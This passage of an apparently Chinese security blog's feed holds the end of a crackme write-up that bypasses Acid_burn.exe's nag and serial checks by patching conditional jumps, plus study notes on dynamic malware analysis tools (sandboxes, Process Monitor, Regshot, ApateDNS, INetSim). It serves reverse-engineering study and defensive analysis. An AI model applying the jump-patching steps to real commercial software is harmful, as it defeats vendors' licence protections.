alt="mark"><br>在0042563D处再次弹窗<br>这里可以看到有个je跳转，我们只要强行跳转就可以去除弹窗了</p><h2 id="Serial-Name窗口破解"><a href="#Serial-Name窗口破解" class="headerlink" title="Serial/Name窗口破解"></a>Serial/Name窗口破解</h2><p>在name和serial输入框随意输入一个字符串和序列号时，此时点击Check it Baby，会弹出try again窗口，内容是sorry，the serial is incorect。</p><p>于是我们搜索字符串<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180301/KLgicHic4G.png?imageslim" alt="mark"><br>这里一个是Serial的提示，一个是Serial/Name的提示，通过试验找到Serial/Name的提示语句位置如下<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180301/dj6HlDbDgD.png?imageslim" alt="mark"><br>0042FB03处的jnz直接跳到jmp下面，也就是说将会提示错误，所以我们只需要nop掉jnz即可</p><h2 id="Serial窗口破解"><a href="#Serial窗口破解" class="headerlink" title="Serial窗口破解"></a>Serial窗口破解</h2><p>和Serial/Name的结构是一样的，直接nop即可</p><h1 id="注册机算法（待补充）"><a href="#注册机算法（待补充）" class="headerlink" title="注册机算法（待补充）"></a>注册机算法（待补充）</h1><p>From <a href="https://kabeor.github.io/001_Acid_burn.exe/">https://kabeor.github.io/001_Acid_burn.exe/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;001-Acid-burn-exe&quot;&gt;&lt;a href=&quot;#001-Acid-burn-exe&quot; class=&quot;headerlink&quot; title=&quot;001_Acid_burn.exe&quot;&gt;&lt;/a&gt;001_Acid_burn.exe&lt;/h1&gt;&lt;p&gt;#爆破法&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="逆向，160个crackme" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C160%E4%B8%AAcrackme/"/>
    
  </entry>
  
  <entry>
    <title>第3章 动态分析基础技术</title>
    <link href="https://kabeor.github.io/%E7%AC%AC3%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/"/>
    <id>https://kabeor.github.io/第3章 动态分析基础技术/</id>
    <published>2018-02-20T08:41:51.090Z</published>
    <updated>2018-03-15T10:17:12.839Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第3章-动态分析基础技术"><a href="#第3章-动态分析基础技术" class="headerlink" title="第3章 动态分析基础技术"></a>第3章 动态分析基础技术</h1><h2 id="3x1-沙箱：简便但粗糙的方法"><a href="#3x1-沙箱：简便但粗糙的方法" class="headerlink" title="3x1 沙箱：简便但粗糙的方法"></a>3x1 沙箱：简便但粗糙的方法</h2><p>沙箱是一种在安全环境里运行不信任程序的安全机制，不用担心伤害到 “真正的” 系统。沙箱包含一个虚拟环境，通过某种方式模拟网络服务，以确保被测试的软件或恶意代码能正常执行。</p><h3 id="1-使用恶意代码沙箱"><a href="#1-使用恶意代码沙箱" class="headerlink" title="1. 使用恶意代码沙箱"></a>1. 使用恶意代码沙箱</h3><p>在计算机安全专业人士眼中， Norman沙箱、GFI沙箱（也就是以前的CWSandbox）是最受欢迎的。</p><h3 id="2-沙箱的缺点"><a href="#2-沙箱的缺点" class="headerlink" title="2. 沙箱的缺点"></a>2. 沙箱的缺点</h3><blockquote><p>沙箱只能简单地运行可执行程序，不能带有命令行选项。如果恶意代码需要一 些命令选项才能执行，在不提供选项的条件下，任何代码都不会被执行。另外，如果你分析的恶意程序样本是一 个后门程序，需要等待一条控制指令，才会启动特定行为，那么在沙箱中这个后门程序将无法被启动和分析。</p><p> 沙箱也不能记录所有事件，因为不管是你或是沙箱，都不会等待足够长的时间让所有事件发生。</p></blockquote><h4 id="潜在的缺点"><a href="#潜在的缺点" class="headerlink" title="潜在的缺点"></a>潜在的缺点</h4><blockquote><p>恶意代码经常检测它是否运行在一 个虚拟机里，并且如果检测到了虚拟机，恶意代码将会停止运行，或者表现异常。不是所有沙箱都能完善地考虑这一问题。</p><p>一些恶意代码需要系统上拥有特定的注册表项或者文件才会执行，而这些在沙箱内是找不到的。这些就可能需要包含一 些合法数据，比如控制命令或者加密钥。</p><p>如果恶意代码是一个DLL，一些导出函数可能不会被恰当地调用，因为一个DLL文件不像可执行文件那样容易运行。</p><p>沙箱环境的操作系统对恶意代码来说可能不正确。例如，恶意代码在Windows XP上正常运行，而在Windows 7上跑不通。</p><p>沙箱不能告诉你恶意代码做了什么。它能报告基本功能，但是它不能告诉你恶意代码是一个定制的SAM密文记录器，或是一个加密的键盘记录后门程序。这些结论需要你自己总结。</p></blockquote><h2 id="3x2-运行恶意代码"><a href="#3x2-运行恶意代码" class="headerlink" title="3x2 运行恶意代码"></a>3x2 运行恶意代码</h2><blockquote><p>如何成功启动DLL文件，来进行动态分析。</p></blockquote><p>在所有的Windows 版本中都包含rundll32.exe程序，它提供了一 个运行DLL的平台，用下面的语法格式：<br><code>C:\&gt;rundll32.exe DLLname, Export arguments</code></p><p>Export值必须是一个DLL文件导出函数表中的函数名或者序号。可以用PEview或者PE Explorer工具查看导出函数表。</p><p>因为恶意的DLL文件通常在DLLMain （称作DLL函数入口点）执行它们的代码，因为无论DLL什么时候被加载，DLLMain函数总会被执行，这样你就总能通过使用rundll32.exe1J口载D LL，而动态地获取信息。除此之外，你甚至可以通过修改PE头部，并改变它的扩展名，使得Windows以一 种可执行文件的方式来加载DLL。</p><p>我们可以使用如下方法来修改PE头部，就是从IMAGE_FILE_HEADER的特征域里擦除IMAGE_FILE_DLL (0x2000）标记。尽管这样的改变不会执行任何输入函数，但它会调用DLLMain方法，而且有可能造成恶意代码意想不到的崩溃或者终止。然而，只要你的修改能使恶意代码执行它的恶意部分，你就能为你的分析收集到信息，余下的就不重要了。</p><p>DLL形态的恶意代码也可能需要被安装成一个服务，SerνiceName参数必须提供给恶意代码，让它能被安装并运行起来。而在Windows系统中启动指定的服务，可以使用net start命令。</p><p>当你看见一个ServiceMain函数，没有像Install或InstallSer、vice这样方便地导出函数，你需妥手动地安装服务。你可以使用Windows系统下的SC命令，或者修改注册表为一个未使用服务进行手动安装，然后使用net start启动服务。Windows服务的注册表项位于HKLM\SYSTEM\CurrentControlSet\Serviceso</p><h2 id="3x3-进程监视器"><a href="#3x3-进程监视器" class="headerlink" title="3x3 进程监视器"></a>3x3 进程监视器</h2><p>进程监视器（Process Monitor）是Windows系统下的高级监视工具，它提供一 种方式来监控注册表、文件系统、网络、进程和线程行为。它结合并增强了两种工具的功能：文件监视器FileMon和注册表监视器RegMon。</p><blockquote><p>由于进程监视器使用内存来记录事件，直到告知它停止捕获，这就可能因耗尽所有可用内存而使虚拟机崩溃。为了避免这样，运行进程监视器就需要限定一 个比较短的时间。为停止进程监视器捕获事件，选择File→Capture Events。在使用进程监视器进行分析之前，首先要清空当前所有截获的事件，通过选择Edit→Clear Display清除掉不相关数据，接下来再执行分析对象，开启监视器捕旗。几分钟之后，就可以终止事件捕获。</p></blockquote><h3 id="1-进程监视器的显示"><a href="#1-进程监视器的显示" class="headerlink" title="1. 进程监视器的显示"></a>1. 进程监视器的显示</h3><p>进程监视器展示了一个可配置栏，包含了每个事件的不同信息，如事件序列号、时间戳、引发事件的进程名、事件操作、事件使用的路径、事件结果等。这些详细的信息可能太长而不适合屏幕显示，或者可能难以清晰地阅读。如果你发现这种情况，可以通过双击该行，来查看这个事件的全部细节。</p><h3 id="2-进程监视器中的过滤"><a href="#2-进程监视器中的过滤" class="headerlink" title="2. 进程监视器中的过滤"></a>2. 进程监视器中的过滤</h3><p>为了设置一 个过滤器，我们选择Filter→Filter打开过滤菜单。当设置一个过滤器时，首先通过左上角的下拉菜单（Reset按钮上面〉选择一栏。对恶意代码分析最重要的过滤栏是进程名、操作和细节。然后，选择一 个比较器，从is、contains、less than中选一项。最后，选择在过滤器里是包含还是排除。因为在默认情况下，过滤器要呈现所有系统调用，所以减少呈现结果的数量十分重要。</p><blockquote><p>进程监视器在工具栏里提供有用的自动过滤功能，它们通过以下四个分类进行过滤：注册表、文件系统、网络和进程行为。</p><p>注册表：通过检查注册表操作，你能辨别一个恶意程序是怎样把自己添加到注册表中去的。</p><p>文件系统：检查文件系统能显示恶意程序创建的所有文件，或它使用的配置文件。</p><p>进程行为：检查进程行为能告诉你恶意程序是否启动了其他的进程。</p><p>网络：识别网络连接能向你展示恶意程序监听的任意端口。</p><p>所有的这四个过滤器都是默认选择的。如果要关闭过滤器，只需简单地单击工具栏上相应的图标即可。</p></blockquote><h2 id="3x4-使用进程浏览器（-Process-Explorer-）来查看进程"><a href="#3x4-使用进程浏览器（-Process-Explorer-）来查看进程" class="headerlink" title="3x4 使用进程浏览器（ Process Explorer ）来查看进程"></a>3x4 使用进程浏览器（ Process Explorer ）来查看进程</h2><p>进程浏览器（Process Explorer）是微软的免费产品，它是一 款非常强大的任务管理器，是进行动态分析时必备的工具。它能对当前系统上运行的进程提供非常有价值的洞察能力。</p><p>你可以用进程浏览器来列出所有活跃的进程、被进程载入的DLL、、各种进程属性和整体系统信息。你也能用它杀死一 个进程、退出用户登录、启动与激活进程。</p><h3 id="1-进程浏览器的显示"><a href="#1-进程浏览器的显示" class="headerlink" title="1. 进程浏览器的显示"></a>1. 进程浏览器的显示</h3><p>进程浏览器监视系统上执行的进程，以树状结构进行显示。</p><p>进程浏览器显示了五栏：Process （进程名）、PID （进程号）、CPU (CPU使用率）、Description（进程描述〉、Company Name （软件公司名〉。视图每一 秒更新一次。默认情况下，服务以粉色高亮显示，进程显示为蓝色，新进程为绿色，被终止进程则为红色。绿色和红色的高亮显示是临时的，当进程被完全启动或终止后颜色就会改变。当分析恶意代码时，需要实时观察进程浏览器窗口中进程的改变或新建进程，保证能够完全地调查它们。</p><h3 id="2-使用验证选项"><a href="#2-使用验证选项" class="headerlink" title="2. 使用验证选项"></a>2. 使用验证选项</h3><p>进程浏览器一个特别有用的功能就是镜像标签里的验证 （Verify）按钮。单击此按钮，可以验证磁盘上的镜像文件是否具有微软的签名认证。因为微软为大部分核心的可执行文件使用了数字签名。通过进程浏览器验证签名是否有效，你就能确定该文件是否确实是微软发布的可执行文件。这一功能对验证磁盘上Windows文件没有被破坏时尤其有用，因为恶意代码经常替换Windows认证文件，并且试图隐藏。</p><p>验证按钮验证的是磁盘上的镜像文件，而不是内存中的，因此它可能会失效，如果一个攻击者使用进程替换技术process replacement，包括在系统上执行进程并用恶意代码重写内存空间，这时候这个功能就不再有用武之地了。进程替换技术为恶意代码提供了和其他进程同样的特权，恶意代码看起来就像一个合法执行的进程一样，但是它在内存中的镜像会和磁盘上的不一样。</p><h3 id="3-比较字符串"><a href="#3-比较字符串" class="headerlink" title="3. 比较字符串"></a>3. 比较字符串</h3><p>一种识别进程替换的方法就是使用进程属性窗口的字符串 （Strings）标签，通过比较包含在磁盘上可执行文件的字符串与内存中同一个可执行文件的字符串，来看两者是否相同。可以用左下角的单选按钮在这两个字符串视图间切换。如果这两个字符串列表有很大不同，那么可能就发生了进程替换。</p><h3 id="4-使用依赖遍历器（-Dependency-Walker"><a href="#4-使用依赖遍历器（-Dependency-Walker" class="headerlink" title="4. 使用依赖遍历器（ Dependency Walker )"></a>4. 使用依赖遍历器（ Dependency Walker )</h3><p>进程浏览器允许你在运行进程上启动depends.exe (Dependency Walker），通过右击进程名并选择Launch→Depends。它也能让你通过选择Find→ Find Handle or DLL找到一个句柄或D LL。</p><p>Find DLL选项在有些时候特别有用，比如当你在磁盘上尝试发现一 个恶意的DLL，并且想知道是否有运行进程使用了这个DLL时。验证按钮验证磁盘上的EXE文件，但不会对所有动态时刻装载的DLL文件进行验证。为了判断一 个DLL是否被加载到进程，你可以比较进程浏览器中的DLL列表与在Dependency Walker工具中显示的导入DLL列表。</p><h3 id="5-分析恶意文档"><a href="#5-分析恶意文档" class="headerlink" title="5. 分析恶意文档"></a>5. 分析恶意文档</h3><p>还可以使用进程浏览器来分析恶意文挡，比如PDF和Word文档。一种快速确定一个文档是否恶意的方法，就是打开进程浏览器，然后再打开文档。若文档启动了任意进程，你都能在进程浏览器中看到，并能通过属性窗口中的镜像Clmage）标签来定位恶意代码在磁盘上的位置。</p><h2 id="3x5-使用Regshot来比较注册表快照"><a href="#3x5-使用Regshot来比较注册表快照" class="headerlink" title="3x5 使用Regshot来比较注册表快照"></a>3x5 使用Regshot来比较注册表快照</h2><p>Regshot是一个开源的注册表比较工具，它可以让你比较两个注册表的快照，发现差异。</p><p>使用Regshot工具分析恶意代码，只要简单地单击1st Shot按钮进行第一次快照，然后运行恶意代码，等待它对系统做出改变，然后单击2nd Shot按钮进行第二次快照，最后单击Compare按钮比较这两次快照。</p><h2 id="3x6-模拟网络"><a href="#3x6-模拟网络" class="headerlink" title="3x6 模拟网络"></a>3x6 模拟网络</h2><p>恶意代码经常会连接到命令与控制服务器。你需要采用一些模拟网络的基本步骤，用来快速获得网络资源，而不需要实际地连接互联网。这些资源可以包括DNS域名系统、IP地址和数据包记录器。</p><p>为了能够成功模拟网络，你必须防止恶意代码探测到自己正运行在一个虚拟环境中 </p><h3 id="1-使用ApateDNS"><a href="#1-使用ApateDNS" class="headerlink" title="1. 使用ApateDNS"></a>1. 使用ApateDNS</h3><p>ApateDNS是一款来自Mandiant公司的免费软件（www.mandiant.com/products/research/mandiant_apatedns/download），是用来查看 恶意代码发出DNS请求最快速的方式。ApateDNS在本机上通过监听UDP的53端口，对用户指定的IP地址给出虚假的DNS响应。它用你指定的IP地址去响应DNS查询请求。ApateDNS可以使用十六进制和ASCII码来显示所有接收到的请求。</p><p>为了使用ApateDNS，需要设置你想在DNS响应包中发出的IP地址，并选择接口。接下来，单击Start Server按钮，这将自动启动DNS服务，并修改DNS设置到localhost上。然后，运行你要分析的恶意代码，就可以在ApateDNS的窗口观察出现的DNS请求。</p><h3 id="2-使用Netcat进行监视"><a href="#2-使用Netcat进行监视" class="headerlink" title="2. 使用Netcat进行监视"></a>2. 使用Netcat进行监视</h3><p>Netcat被称作 “TCP/IP协议枝瑞士军刀” ，可以被用在支持端口扫描、隧道、代理、端口转发等的对内对外连接上。在监听模式下，Netcat充当一个服务器，而在连接模式下作为一 个客户端。Netcat从标准输入得到数据进行网络传输，而它得到的数据，又可以通过标准输出显示到屏幕上。</p><h2 id="3x7-使用Wireshark进行数据包监听"><a href="#3x7-使用Wireshark进行数据包监听" class="headerlink" title="3x7 使用Wireshark进行数据包监听"></a>3x7 使用Wireshark进行数据包监听</h2><p>Wireshark是一 个开源的嗅探器，是一个截获并记录网络数据包的工具。 Wireshark提供可视化、包一流分析和单个数据包的深入分析。</p><blockquote><p>Wireshark的界面显示有四部分</p><p>过滤栏。用来过滤显示的数据包。<br>数据包列表显示了所有满足过滤条件的数据包。<br>数据包细节窗口显示了当前选中包的详细内容。<br>十六进制窗口。显示了当前数据包的十六进制内容，十六进制窗口和数据包细节窗口紧密关联，会高亮显示你所选择的任何域。</p></blockquote><h2 id="3x8-使用INetSim"><a href="#3x8-使用INetSim" class="headerlink" title="3x8 使用INetSim"></a>3x8 使用INetSim</h2><p>INetSim是一款基于Linux模拟常见网络服务的免费软件。</p><p>INetSim是一 款提供 模 拟服 务最 好 的免 费工 具 ，它通 过 模拟 服 务 〈如Http、HTTPS、FTP、IRC、DNS、SMTP等），允许你分析未知恶意代码的网络行为。</p><blockquote><p>INetSim努力伪装得像一 台真正的服务器，有许多容易配置的特性来保证其成功。例如，若被扫描到，它会返回Microsoft IIS网络服务器的旗标。</p><p>INetSim一 些最好的特性被融进了HTTP和HTTPS服务模拟中。例如，IN etSim 几乎能提供所有的文件请求服务：如果一 个恶意程序从一 个站点请求JPEG 以继续它的操作，IN etSim 就会回应一 个适当的JPEG。虽然这个图片可能不是恶意代码要找的，但服务器不至于给出404或者其他错误。这个响应即使不正确，仍能保证恶意代码继续运行。</p><p>INetSim也可以记录所有的连入请求与连接，你会发现这个功能特别有用，比如可以判断一 个恶意代码是否连接到一 个标准服务，或是查看它所发出的请求。IN etSim 也非常容易配置，例如，你可以设置请求后返回一 个页面或者一 个项 目，因此如果你发现你分析的恶意代码在查找一 个特别的网页，然后才能继续执行，你就可以提供这个网页：你也能修改不同服务监听的端口号，这对恶意代码使用非标准端口时非常有用。</p><p>INetSim专为恶意代码分析而创建，所以它也提供了许多独特的优点，比如它的Dummy服务就记录了所有从客户端口收到的数据。Dummy服务在捕获所有从客户端向端口发出的数据时最有用，而不受制于其他服务模块。你可以使用它记录恶意代码连接的所有端口和发送数据。至少TCP握手会完整地进行，一些进一 步传输的额外数据也可以收集到。</p></blockquote><p>From <a href="https://kabeor.github.io/第3章 动态分析基础技术/">https://kabeor.github.io/第3章 动态分析基础技术/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第3章-动态分析基础技术&quot;&gt;&lt;a href=&quot;#第3章-动态分析基础技术&quot; class=&quot;headerlink&quot; title=&quot;第3章 动态分析基础技术&quot;&gt;&lt;/a&gt;第3章 动态分析基础技术&lt;/h1&gt;&lt;h2 id=&quot;3x1-沙箱：简便但粗糙的方法&quot;&gt;&lt;a href=
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
      <category term="第一篇 静态分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%B8%80%E7%AF%87-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>PE文件结构图</title>
    <link href="https://kabeor.github.io/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%9B%BE/"/>
    <id>https://kabeor.github.io/PE文件结构图/</id>
    <published>2018-02-19T11:04:57.020Z</published>
    <updated>2018-03-15T10:16:34.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="点击放大查看"><a href="#点击放大查看" class="headerlink" title="点击放大查看"></a>点击放大查看</h2><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180219/CLA2f8j3Eg.jpg?imageslim" alt="mark"><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180219/3k29KD41ia.jpg?imageslim" alt="mark"></p><p>From <a href="https://kabeor.github.io/PE文件结构图/">https://kabeor.github.io/PE文件结构图/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;点击放大查看&quot;&gt;&lt;a href=&quot;#点击放大查看&quot; class=&quot;headerlink&quot; title=&quot;点击放大查看&quot;&gt;&lt;/a&gt;点击放大查看&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;http://p29uh0fw7.bkt.clouddn.com/kabeo/18021
      
    
    </summary>
    
      <category term="计算机系统" scheme="https://kabeor.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="PE" scheme="https://kabeor.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/PE/"/>
    
    
      <category term="PE" scheme="https://kabeor.github.io/tags/PE/"/>
    
  </entry>
  
</feed>
